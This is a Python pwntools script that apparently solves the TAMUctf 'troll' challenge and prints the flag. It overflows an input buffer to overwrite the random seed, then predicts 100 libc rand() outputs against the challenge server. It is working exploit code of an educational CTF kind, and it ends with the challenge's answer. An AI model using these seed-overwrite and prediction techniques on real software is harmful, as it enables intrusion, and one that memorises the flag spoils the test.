from pwn import *
from ctypes import CDLL
libc = CDLL('/usr/lib/libc.so.6')

#p = process('./troll')
p = remote('challenges.tamuctf.com', 4765)
# overwrite seed buffer
p.sendlineafter('there?\n', 'A'*64 + 'BBBB')

libc.srand(0x42424242)

# calculation
def calculation(i):
    num={}

    eax = libc.rand()
    ecx = eax
    edx = 0x14f8b589

    nop = eval('0x' + hex(eax*edx)[-8:])
    edx = eval(hex(eax*edx)[:-8])
    eax = nop

    edx = edx >> 0xd
    eax = ecx
    eax = eax >> 0x1f

    edx = edx - eax
    eax = edx
    eax = eax * 0x186a0

    ecx = ecx - eax
    eax = ecx
    eax += 1

    num['eax']=eax
    num['ecx']=ecx
    num['edx']=edx

    print(),i
    log.info('rax : %s'%hex(num['eax']))
    log.info('rcx : %s'%hex(num['ecx']))
    log.info('rdx : %s'%hex(num['edx']))
    
    return num
    

for i in xrange(0x63+1):
    num = calculation(i)
    p.sendlineafter('it?\n', str(num['eax']))
log.success(p.recvlines(3)[-1])
# gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}